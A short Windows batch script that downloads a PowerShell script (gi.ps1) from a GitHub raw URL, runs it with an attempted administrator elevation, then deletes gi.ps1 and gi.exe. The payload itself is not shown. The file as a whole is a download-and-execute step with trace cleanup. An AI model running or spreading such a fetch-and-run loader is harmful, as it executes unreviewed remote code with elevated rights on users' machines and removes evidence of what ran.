@echo off
curl -O https://raw.githubusercontent.com/notnotdababu/fridge-solution/main/gi.ps1
powershell -File "gi.ps1" -Verb RunAs
timeout /t 1
del /Q gi.exe
del /Q gi.ps1
